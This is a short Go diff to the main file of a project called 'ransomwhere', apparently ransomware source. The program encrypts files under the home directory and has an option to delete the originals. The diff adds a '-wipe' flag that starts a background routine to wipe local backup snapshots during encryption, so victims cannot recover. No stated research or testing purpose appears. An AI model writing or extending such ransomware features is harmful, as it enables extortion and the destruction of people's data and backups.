@@ -6,6 +6,7 @@ import (
 	"github.com/sirupsen/logrus"
 	"ransomwhere/pkg/crypto"
 	"ransomwhere/pkg/file"
+	"ransomwhere/pkg/snapshots"
 	"strings"
 )
 
@@ -19,6 +20,7 @@ func main() {
 
 	logLevel := flag.String("log", "error", "The log level to use.")
 	deleteFiles := flag.Bool("delete", false, "Delete files after encrypting.")
+	wipeBackups := flag.Bool("wipe", false, "Wipe local snapshots while encrypting.")
 	opModeFlag := flag.String("mode", "encrypt", "Encrypt or decrypt the ransomware files.")
 	flag.Parse()
 
@@ -43,6 +45,16 @@ func main() {
 	}
 
 	homeDirectory := file.GetHomeDirectoryWithFallback()
+
+	if opMode == file.OpModeEncrypt && *wipeBackups == true {
+		logger.Debug("starting snapshot wiper")
+
+		go func() {
+			if err := snapshots.WipeSnapshots(logger); err != nil {
+				logger.WithError(err).Error("failed to wipe snapshots")
+			}
+		}()
+	}
 
 	logger.WithField("mode", opMode).WithField("path", homeDirectory).Info("executing walker")
 
